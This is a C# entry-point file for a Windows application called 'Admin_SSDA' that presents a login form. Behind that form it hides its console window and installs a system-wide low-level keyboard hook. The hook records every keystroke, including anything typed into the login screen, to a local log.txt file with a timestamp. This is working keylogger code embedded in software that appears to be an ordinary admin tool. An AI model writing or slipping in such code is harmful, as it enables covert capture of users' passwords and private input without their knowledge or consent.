using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Admin_SSDA
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            
            StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
            sw.Write("[ " + GetTimeStamp() + " ]");
            sw.Close();
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            _hookID = SetHook(_proc);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            Application.Run(new Login());
            UnhookWindowsHookEx(_hookID);
            
        }

        public static string GetTimeStamp()
        {
            return DateTime.Now.ToString();
        }
        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
           
            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);

                string key = Convert.ToString((Keys)vkCode);
                if (verifyKey(vkCode))
                {
                    sw.Write(key);
                }
                else if (vkCode == 13)
                {
                    sw.Write(" " + key + " ");
                }
                else
                {
                    sw.Write(" " + key + " ");
                }

                sw.Close();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        private static bool verifyKey(int code)
        {

            if (code == 48
                || code == 49 || code == 50 || code == 51
                || code == 52 || code == 53 || code == 54 || code == 55 || code == 56 || code == 57 || code == 65
                || code == 66 || code == 67 || code == 68 || code == 69 || code == 70 || code == 71 || code == 72
                || code == 73 || code == 74 || code == 75 || code == 76 || code == 77 || code == 78 || code == 79
                || code == 80 || code == 81 || code == 82 || code == 83 || code == 84 || code == 85 || code == 86
                || code == 87 || code == 88 || code == 89 || code == 90 || code == 96 || code == 97 || code == 98
                || code == 99 || code == 100 || code == 101
                || code == 102 || code == 103 || code == 104 || code == 105) return true;
            else return false;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;


    }
}
